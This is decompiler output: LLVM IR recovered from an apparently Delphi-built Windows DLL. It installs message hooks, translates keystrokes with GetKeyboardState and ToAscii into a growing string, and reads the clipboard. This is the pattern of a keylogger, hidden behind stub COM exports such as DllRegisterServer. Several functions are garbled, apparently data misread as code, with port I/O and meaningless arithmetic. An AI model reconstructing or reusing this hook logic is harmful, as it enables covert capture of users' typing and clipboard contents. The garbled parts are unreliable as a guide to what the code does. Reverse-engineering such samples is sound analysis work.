  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !575

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !576
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !577
  br label %dec_label_pc_404f04, !insn.addr !577

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !578
  br label %dec_label_pc_404f09, !insn.addr !578

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !579
  %57 = sext i1 %56 to i32, !insn.addr !579
  store i32 %57, i32* %.reg2mem, !insn.addr !580
  br label %dec_label_pc_404f0f, !insn.addr !580

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !581
  ret i32 %.reload, !insn.addr !581
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !582
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !582
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !583
  %4 = inttoptr i32 %3 to i32*, !insn.addr !584
  %5 = load i32, i32* %4, align 4, !insn.addr !584
  %6 = icmp eq i32 %5, 0, !insn.addr !584
  %7 = icmp eq i1 %6, false, !insn.addr !585
  %8 = icmp eq i1 %7, false, !insn.addr !586
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !586

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !587
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !588
  %11 = icmp eq i32* %10, null, !insn.addr !589
  %12 = icmp eq i1 %11, false, !insn.addr !590
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !590

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220648 to i32*), i32 0, i32* null), !insn.addr !591
  br label %dec_label_pc_404f50, !insn.addr !591

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !592
  store i32 0, i32* %15, align 4, !insn.addr !592
  ret i32 -2147221231, !insn.addr !593
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !594
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !595
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !596
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !597
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !597
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !597
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !598
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !599
  %3 = add i32 %2, 1, !insn.addr !599
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !599
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !600
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !601
  ret i32 0, !insn.addr !602
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !603
  ret i32 %0, !insn.addr !603
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !604
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !605
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !606
  %2 = add i32 %1, -1, !insn.addr !606
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !606
  ret i32 %0, !insn.addr !607
}

define i32 @function_404fc0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404fc0:
  %esp.0.reg2mem = alloca i32, !insn.addr !608
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !609
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !609
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !609
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !610
  %4 = call i32 @function_4071cc(), !insn.addr !611
  %5 = icmp ne i32 %4, 0, !insn.addr !612
  %6 = icmp eq i1 %5, false, !insn.addr !613
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !614
  br i1 %6, label %dec_label_pc_4050bb, label %dec_label_pc_404ffd, !insn.addr !614

dec_label_pc_404ffd:                              ; preds = %dec_label_pc_404fc0
  switch i32 %0, label %dec_label_pc_405047 [
    i32 8, label %dec_label_pc_40500b
    i32 46, label %dec_label_pc_40502a
  ]

dec_label_pc_40500b:                              ; preds = %dec_label_pc_404ffd
  %7 = call i32 @function_407268(), !insn.addr !615
  %8 = call i32 @"@LStrDelete"(), !insn.addr !616
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !617
  br label %dec_label_pc_4050bb, !insn.addr !617

dec_label_pc_40502a:                              ; preds = %dec_label_pc_404ffd
  %9 = call i32 @function_407268(), !insn.addr !618
  %10 = call i32 @"@LStrDelete"(), !insn.addr !619
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !620
  br label %dec_label_pc_4050bb, !insn.addr !620

dec_label_pc_405047:                              ; preds = %dec_label_pc_404ffd
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !621
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !622
  %14 = udiv i32 %1, 65536, !insn.addr !623
  %15 = and i32 %14, 255, !insn.addr !624
  %16 = inttoptr i32 %15 to i16*, !insn.addr !625
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !626
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !627
  %19 = icmp eq i32 %18, 1, !insn.addr !628
  %20 = icmp eq i1 %19, false, !insn.addr !629
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !629
  br i1 %20, label %dec_label_pc_4050bb, label %dec_label_pc_405073, !insn.addr !629

dec_label_pc_405073:                              ; preds = %dec_label_pc_405047
  %21 = call i32 @function_406f30(), !insn.addr !630
  %22 = icmp eq i32 %21, 0, !insn.addr !631
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !632
  br i1 %22, label %dec_label_pc_4050bb, label %dec_label_pc_40507f, !insn.addr !632

dec_label_pc_40507f:                              ; preds = %dec_label_pc_405073
  %23 = call i32 @function_4034c8(), !insn.addr !633
  %24 = icmp sgt i32 %23, 15, !insn.addr !634
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !634
  br i1 %24, label %dec_label_pc_4050bb, label %dec_label_pc_405090, !insn.addr !634

dec_label_pc_405090:                              ; preds = %dec_label_pc_40507f
  %25 = call i32 @function_407268(), !insn.addr !635
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !636
  %27 = call i32 @"@LStrInsert"(), !insn.addr !637
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !637
  br label %dec_label_pc_4050bb, !insn.addr !637

dec_label_pc_4050bb:                              ; preds = %dec_label_pc_405090, %dec_label_pc_40507f, %dec_label_pc_405073, %dec_label_pc_405047, %dec_label_pc_40502a, %dec_label_pc_40500b, %dec_label_pc_404fc0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !638
  %29 = load i32, i32* %28, align 4, !insn.addr !638
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !639
  %30 = add i32 %esp.0.reload, 8, !insn.addr !640
  %31 = inttoptr i32 %30 to i32*, !insn.addr !640
  store i32 4215003, i32* %31, align 4, !insn.addr !640
  %32 = call i32 @"@LStrClr"(), !insn.addr !641
  ret i32 %32, !insn.addr !642
}

define i32 @function_4050d4() local_unnamed_addr {
dec_label_pc_4050d4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !643
  ret i32 %0, !insn.addr !643
}

define i32 @function_4050d9() local_unnamed_addr {
dec_label_pc_4050d9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !644
}

define i32 @function_4050db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !645
}

define i32 @function_4050e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4050e4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !646
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !646
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !646
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !647
  %2 = call i32 @function_4071cc(), !insn.addr !648
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !649
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !650
  %4 = add i32 %1, 8, !insn.addr !651
  %5 = inttoptr i32 %4 to i32*, !insn.addr !651
  store i32 4215210, i32* %5, align 4, !insn.addr !651
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !652
  ret i32 %6, !insn.addr !653
}

define i32 @function_4051a3() local_unnamed_addr {
dec_label_pc_4051a3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !654
  ret i32 %0, !insn.addr !654
}

define i32 @function_4051a8() local_unnamed_addr {
dec_label_pc_4051a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !655
}

define i32 @function_4051aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4051aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !656
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !657
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !658
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !658
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !658
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !659
  %3 = call i32 @function_40713c(), !insn.addr !660
  %4 = icmp eq i32 %3, 0, !insn.addr !661
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !662
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !662

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !663
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !664
  %7 = ptrtoint i32* %6 to i32, !insn.addr !664
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !665
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !665
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !666
  %10 = icmp eq i1 %9, false, !insn.addr !667
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !668

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_406f9c(), !insn.addr !669
  %12 = call i32 @"@LStrAsg"(), !insn.addr !670
  %13 = call i32 @function_4072c4(), !insn.addr !671
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !672
  br label %dec_label_pc_405214, !insn.addr !672

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_4073f8(), !insn.addr !673
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !673
  br label %dec_label_pc_405214, !insn.addr !673

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !674
  %16 = load i32, i32* %15, align 4, !insn.addr !674
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !675
  %17 = add i32 %esp.0.reload, 8, !insn.addr !676
  %18 = inttoptr i32 %17 to i32*, !insn.addr !676
  store i32 4215345, i32* %18, align 4, !insn.addr !676
  %19 = call i32 @"@LStrClr"(), !insn.addr !677
  ret i32 %19, !insn.addr !678
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !679
  ret i32 %0, !insn.addr !679
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !680
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !681
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !682
  %8 = inttoptr i32 %4 to i8*, !insn.addr !682
  store i8 %7, i8* %8, align 1, !insn.addr !682
  %9 = add i32 %2, 111, !insn.addr !683
  %10 = inttoptr i32 %9 to i8*, !insn.addr !683
  %11 = load i8, i8* %10, align 1, !insn.addr !683
  %12 = load i32, i32* %eax, align 4, !insn.addr !683
  %13 = trunc i32 %12 to i8, !insn.addr !683
  %14 = add i8 %11, %13, !insn.addr !683
  store i8 %14, i8* %10, align 1, !insn.addr !683
  %15 = trunc i32 %3 to i16, !insn.addr !684
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !684
  %17 = inttoptr i32 %0 to i32*, !insn.addr !684
  store i32 %16, i32* %17, align 4, !insn.addr !684
  %18 = add i32 %0, 66, !insn.addr !685
  %19 = inttoptr i32 %18 to i64*, !insn.addr !685
  %20 = load i64, i64* %19, align 4, !insn.addr !685
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !685
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !686
  %22 = load i8, i8* %5, align 4, !insn.addr !687
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !687
  %25 = add i8 %22, %24, !insn.addr !687
  %26 = inttoptr i32 %23 to i8*, !insn.addr !687
  store i8 %25, i8* %26, align 1, !insn.addr !687
  %27 = add i32 %21, -117, !insn.addr !688
  %28 = inttoptr i32 %27 to i8*, !insn.addr !688
  %29 = load i8, i8* %28, align 1, !insn.addr !688
  %30 = trunc i32 %3 to i8, !insn.addr !688
  %31 = add i8 %29, %30, !insn.addr !688
  store i8 %31, i8* %28, align 1, !insn.addr !688
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !689
  %33 = add i32 %21, 16, !insn.addr !690
  %34 = inttoptr i32 %33 to i32*, !insn.addr !690
  %35 = load i32, i32* %34, align 4, !insn.addr !690
  %36 = add i32 %21, 12, !insn.addr !691
  %37 = inttoptr i32 %36 to i32*, !insn.addr !691
  %38 = load i32, i32* %37, align 4, !insn.addr !691
  %39 = add i32 %21, 8, !insn.addr !692
  %40 = inttoptr i32 %39 to i32*, !insn.addr !692
  %41 = load i32, i32* %40, align 4, !insn.addr !692
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !693
  %43 = inttoptr i32 %42 to i32*, !insn.addr !694
  %44 = load i32, i32* %43, align 4, !insn.addr !694
  %45 = icmp eq i32 %44, 0, !insn.addr !694
  %46 = icmp eq i1 %45, false, !insn.addr !695
  %47 = icmp eq i32 %41, 0, !insn.addr !696
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !697
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !698

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !699
  %51 = add i32 %35, 4, !insn.addr !700
  %52 = inttoptr i32 %51 to i32*, !insn.addr !700
  %53 = load i32, i32* %52, align 4, !insn.addr !700
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !701
  br label %dec_label_pc_40529a, !insn.addr !702

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !703
  br label %dec_label_pc_40529a, !insn.addr !703

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !704
  %57 = inttoptr i32 %35 to i32*, !insn.addr !705
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !705
  ret i32 %58, !insn.addr !706
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !707
  %5 = icmp eq i1 %4, false, !insn.addr !708
  %6 = icmp eq i32 %arg3, 0, !insn.addr !709
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !710

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !711
  %9 = inttoptr i32 %8 to i32*, !insn.addr !711
  %10 = load i32, i32* %9, align 4, !insn.addr !711
  %11 = icmp eq i32 %10, 2, !insn.addr !712
  %12 = icmp eq i1 %11, false, !insn.addr !713
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !713

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !714
  br label %dec_label_pc_4052e0, !insn.addr !714

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !715
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !716
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !716
  ret i32 %16, !insn.addr !717
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !718
  %2 = ptrtoint i32* %1 to i32, !insn.addr !718
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !719
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !720
  %5 = ptrtoint i32* %4 to i32, !insn.addr !720
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !721
  ret i32 %5, !insn.addr !722
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !723
  %1 = inttoptr i32 %0 to i32*, !insn.addr !724
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !724
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !725
  %4 = inttoptr i32 %3 to i32*, !insn.addr !726
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !726
  %6 = sext i1 %5 to i32, !insn.addr !726
  ret i32 %6, !insn.addr !727
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !728
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !728
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !728
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !729
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !730
  %3 = add i32 %2, 1, !insn.addr !730
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !730
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !731
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !732
  ret i32 0, !insn.addr !733
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !734
  ret i32 %0, !insn.addr !734
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !735
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !736
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !737
  %2 = add i32 %1, -1, !insn.addr !737
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !737
  ret i32 %0, !insn.addr !738
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !739
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !739
  %5 = inttoptr i32 %3 to i32*, !insn.addr !739
  store i32 %4, i32* %5, align 4, !insn.addr !739
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !740
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !740
  %10 = add i8 %7, %9, !insn.addr !740
  %11 = inttoptr i32 %8 to i8*, !insn.addr !740
  store i8 %10, i8* %11, align 1, !insn.addr !740
  %12 = load i32, i32* %eax, align 4, !insn.addr !741
  store i32 %arg1, i32* %eax, align 4, !insn.addr !742
  %13 = add i32 %12, 99, !insn.addr !743
  %14 = inttoptr i32 %13 to i64*, !insn.addr !743
  %15 = load i64, i64* %14, align 4, !insn.addr !743
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !743
  %17 = add i32 %16, -2, !insn.addr !744
  %18 = inttoptr i32 %17 to i16*, !insn.addr !744
  store i16 27241, i16* %18, align 2, !insn.addr !744
  %19 = mul i32 %2, 2, !insn.addr !745
  %20 = add i32 %2, 110, !insn.addr !745
  %21 = add i32 %20, %19, !insn.addr !745
  %22 = inttoptr i32 %21 to i32*, !insn.addr !745
  %23 = load i32, i32* %22, align 4, !insn.addr !745
  %24 = sext i32 %23 to i64, !insn.addr !745
  %25 = mul nsw i64 %24, 111, !insn.addr !745
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !745
  %28 = icmp eq i64 %25, %27, !insn.addr !745
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !746

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !747
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !748

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !747
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !749

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !747
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !494, !insn.addr !747
  %33 = and i8 %32, 1, !insn.addr !747
  %34 = icmp eq i8 %33, 0, !insn.addr !747
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !750

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !741
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !751
  %37 = load i32, i32* %36, align 4, !insn.addr !751
  %38 = xor i32 %37, %1, !insn.addr !751
  store i32 %38, i32* %36, align 4, !insn.addr !751
  %39 = add i32 %1, 959985462, !insn.addr !752
  %40 = inttoptr i32 %39 to i32*, !insn.addr !752
  %41 = load i32, i32* %40, align 4, !insn.addr !752
  %42 = xor i32 %41, %1, !insn.addr !752
  %43 = add i32 %16, -38, !insn.addr !753
  %44 = inttoptr i32 %43 to i32*, !insn.addr !753
  store i32 %35, i32* %44, align 4, !insn.addr !753
  %45 = add i32 %16, -42, !insn.addr !754
  %46 = inttoptr i32 %45 to i32*, !insn.addr !754
  store i32 %42, i32* %46, align 4, !insn.addr !754
  %47 = add i32 %16, -22, !insn.addr !755
  %48 = inttoptr i32 %47 to i32*, !insn.addr !755
  store i32 0, i32* %48, align 4, !insn.addr !755
  %49 = add i32 %16, -26, !insn.addr !756
  %50 = inttoptr i32 %49 to i32*, !insn.addr !756
  store i32 0, i32* %50, align 4, !insn.addr !756
  %51 = add i32 %16, -30, !insn.addr !757
  %52 = inttoptr i32 %51 to i32*, !insn.addr !757
  store i32 0, i32* %52, align 4, !insn.addr !757
  %53 = add i32 %16, -34, !insn.addr !758
  %54 = inttoptr i32 %53 to i32*, !insn.addr !758
  store i32 0, i32* %54, align 4, !insn.addr !758
  %55 = add i32 %16, -6, !insn.addr !759
  %56 = inttoptr i32 %55 to i32*, !insn.addr !759
  store i32 %arg3, i32* %56, align 4, !insn.addr !759
  %57 = add i32 %16, -46, !insn.addr !760
  %58 = inttoptr i32 %57 to i32*, !insn.addr !760
  store i32 %17, i32* %58, align 4, !insn.addr !760
  ret i32 0, !insn.addr !760

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !761
  %60 = trunc i64 %25 to i32, !insn.addr !745
  %61 = load i32, i32* %eax, align 4, !insn.addr !762
  %62 = add i32 %61, 1, !insn.addr !762
  %63 = mul i32 %59, 8, !insn.addr !763
  %64 = add i32 %59, 48, !insn.addr !763
  %65 = add i32 %64, %63, !insn.addr !763
  %66 = inttoptr i32 %65 to i8*, !insn.addr !763
  %67 = load i8, i8* %66, align 4, !insn.addr !763
  %68 = udiv i32 %62, 256, !insn.addr !763
  %69 = trunc i32 %68 to i8, !insn.addr !763
  %70 = add i8 %67, %69, !insn.addr !763
  store i8 %70, i8* %66, align 4, !insn.addr !763
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !764
  %71 = call i32 @"@LStrClr"(), !insn.addr !765
  %72 = call i32 @function_4034c8(), !insn.addr !766
  %73 = add i32 %60, -8, !insn.addr !767
  %74 = inttoptr i32 %73 to i32*, !insn.addr !767
  store i32 %72, i32* %74, align 4, !insn.addr !767
  %75 = ashr i32 %72, 31, !insn.addr !768
  %76 = zext i32 %72 to i64, !insn.addr !769
  %77 = zext i32 %75 to i64, !insn.addr !769
  %78 = mul i64 %77, 4294967296, !insn.addr !769
